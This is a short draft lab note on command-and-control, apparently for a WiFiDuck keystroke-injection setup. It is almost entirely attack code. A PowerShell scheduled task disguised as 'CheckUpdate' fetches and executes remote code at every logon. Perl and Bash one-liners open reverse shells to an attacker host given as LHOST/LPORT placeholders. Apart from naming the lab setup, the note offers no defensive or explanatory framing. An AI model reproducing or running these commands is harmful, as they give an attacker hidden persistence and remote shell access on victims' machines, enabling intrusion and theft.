# Command&Control [draft]

## Setup Lab
- WiFiDuck
- Windows guest
- Remote Host (C2)

Windows Task
$a = New-ScheduledTaskAction -Execute 'powershell' -Argument '$rawcmd = Invoke-webrequest -URI https://URL -UseBasicParsing; Invoke-Expression $rawcmd;';

$t = New-ScheduledTaskTrigger -AtLogon;

Register-ScheduledTask -Action $a -Trigger $t -TaskPath "CheckUpdate" -TaskName "CheckUpdate" -Description "Check update."

## Villain C2

``` perl
# simple perl payload
perl -MIO::Socket::INET -e '$s=IO::Socket::INET->new(PeerAddr=>"*LHOST*",PeerPort=>*LPORT*,Proto=>"tcp");open(STDIN, "<&", $s);open(STDOUT, ">&", $s);open(STDERR, ">&", $s);exec "/bin/bash"'
```

``` bash
# very simple bash payload
nohup /bin/bash -c 'bash -i >& /dev/tcp/*LHOST*/*LPORT* 0>&1 &'
```
